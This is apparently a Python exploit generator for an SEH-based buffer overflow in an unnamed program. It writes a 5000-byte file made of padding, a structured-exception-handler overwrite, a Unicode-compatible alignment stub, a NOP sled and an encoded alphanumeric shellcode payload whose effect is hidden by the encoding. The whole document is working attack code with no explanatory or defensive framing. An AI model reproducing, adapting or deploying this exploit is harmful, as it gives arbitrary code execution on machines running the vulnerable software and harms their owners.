#!/usr/bin/python

f = open('exploit.txt','wb')

nseh = b'\x61\x62' #popad
seh = b'\x37\x7a' #007A0037

valign = (
b"\x53" 					#push ebx
b"\x47" 					#align
b"\x58" 					#pop eax
b"\x47" 					#align
b"\x05\x16\x11" 	        #add eax,600
b"\x47"					#align
b"\x2d\x13\x11"	        #sub eax,300
b"\x47"					#align
b"\x50"					#push eax
b"\x47"					#align
b"\xc3"					#retn
)
nop="\x90"*365

shellcode=(
b"PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AA"
b"PAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPM0M0S0DIK501I0C44"
b"K0PP0DKPRLLTKQBMDTKBRO8LOFWOZMV01KOFLOLS13LLBNLO0WQXOLMKQI7K2KB0RQGTKPRN0DK0J"
b"OL4K0LN1CHISOXKQXQ214K0YMPKQJ3DK0IN8K3NZOYTKNT4KM1YFNQKO6L91XOLMM1WW08IP45ZVK"
b"S3MZXOKSMMTRUK4B8TKPXO4M1YCBFDKLLPKDKR8MLM1YC4KKTTKM18PU9PDO4MT1K1KQQR91J0QKO"
b"IP1O1O1J4KN2ZK4MQMRJM14MSUVRM0M0M0PP2HNQTKROSWKO8UWKZPH55R1FQX6FF5WMEMKOXUOLL"
b"F3LKZE0KKYPRUM5GKOWMCCBRO2JM023KOYE1S1QRLBCNNRERX1UM0AA")

buffer = b'A'*1019
buffer += nseh
buffer += seh
buffer += valign
buffer += nop
buffer += shellcode
buffer += b"\xCC"* (5000-len(buffer))

f.write(buffer + b'\n')
